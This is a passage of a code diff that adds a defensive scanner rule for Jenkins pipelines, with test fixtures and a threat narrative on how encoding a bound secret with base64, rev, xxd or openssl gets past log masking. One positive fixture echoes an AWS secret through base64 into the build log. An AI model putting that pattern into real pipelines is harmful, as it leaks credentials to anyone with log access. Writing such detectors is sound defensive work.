+                "pipeline {\n"
+                "  agent any\n"
+                "  environment {\n"
+                "    AWS_SECRET = credentials('aws')\n"
+                "  }\n"
+                "  stages {\n"
+                "    stage('x') {\n"
+                "      steps {\n"
+                '        sh "echo $AWS_SECRET | base64"\n'
+                "      }\n"
+                "    }\n"
+                "  }\n"
+                "}"
+            ),
+        ],
+        test_negative=[
+            # Legitimate authenticated egress — secret passed verbatim to the
+            # intended TLS endpoint (the dominant corpus shape). No transform.
+            (
+                "withCredentials([usernamePassword(credentialsId: 'c', "
+                "usernameVariable: 'username', passwordVariable: 'password')]) {\n"
+                '    sh \'curl --fail --user "$username:$password" -X PUT '
+                "https://artifactory.example.com/repo/file'\n"
+                "}"
+            ),
+            # Decode direction (base64 -d) — SEC4-JK-006's territory; excluded
+            # so the two rules never co-fire.
+            (
+                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
+                "    sh 'echo $ENCODED | base64 -d > payload.bin'\n"
+                "}"
+            ),
+            # Transform of a NON-credential variable — not a bound secret.
+            (
+                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
+                '    sh "echo $BUILD_ID | base64"\n'
+                "}"
+            ),
+            # base64 appears only in a comment — structurally masked, no shell sink.
+            (
+                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
+                "    // echo $TOKEN | base64 would leak the secret\n"
+                "    sh 'deploy.sh'\n"
+                "}"
+            ),
+            # No credential binding at all — bare base64 of a plain variable.
+            'sh "echo $DATA | base64"',
+        ],
+        stride=["I", "R"],
+        threat_narrative=(
+            "Jenkins' credential masking only redacts the literal secret value "
+            "from logs. An attacker — or a careless author — who pipes a bound "
+            "secret through base64, rev, xxd, or openssl emits an encoded form "
+            "the masking matcher never recognizes, writing a trivially-reversible "
+            "copy of the credential into the console log. Anyone with build-log "
+            "read access (often a broad group, and frequently forwarded to "
+            "long-lived log-aggregation backends) can recover the plaintext "
+            "secret and reuse it against the systems it protects."
+        ),
+        incidents=[
+            "Jenkins credentials-masking limitation (jenkins.io blog 2019-02-21); SECURITY-3547 / CVE-2025-53651 masking-limit family"
+        ],
     ),
 ]
